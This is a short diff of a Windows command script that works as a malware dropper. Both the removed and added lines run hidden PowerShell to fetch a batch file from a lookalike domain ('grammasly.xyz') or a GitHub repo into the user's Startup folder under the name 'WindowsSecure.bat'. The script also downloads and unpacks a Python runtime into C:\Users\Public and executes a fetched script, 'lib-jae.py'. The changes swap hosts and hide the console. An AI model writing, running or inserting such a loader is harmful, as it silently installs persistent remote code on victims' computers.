@@ -1,6 +1,6 @@
-C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI http://grammasly.xyz/config/stu -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://github.com/lammanagerdatabot/config/raw/main/stu -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
 cmd /c mkdir "C:\\Users\\Public\\python39";
-cmd /c curl https://github.com/lammanagerdatabot/config/raw/main/python39.zip -o "C:\\Users\\Public\\python39\\python39.zip"
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://github.com/lammanagerdatabot/config/raw/main/python39.zip -OutFile "C:\\Users\\Public\\python39\\python39.zip"
 cmd /c tar -xf C:\\Users\\Public\\python39\\python39.zip -C "C:\\Users\\Public\\python39"
-cmd /c curl https://github.com/lammanagerdatabot/config/raw/main/pycall -o "C:\\Users\\Public\\python39\\lib-jae.py"
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://github.com/lammanagerdatabot/config/raw/main/pycall -OutFile "C:\\Users\\Public\\python39\\lib-jae.py"
 cmd /c C:\\Users\\Public\\python39\\python.exe "C:\\Users\\Public\\python39\\lib-jae.py"
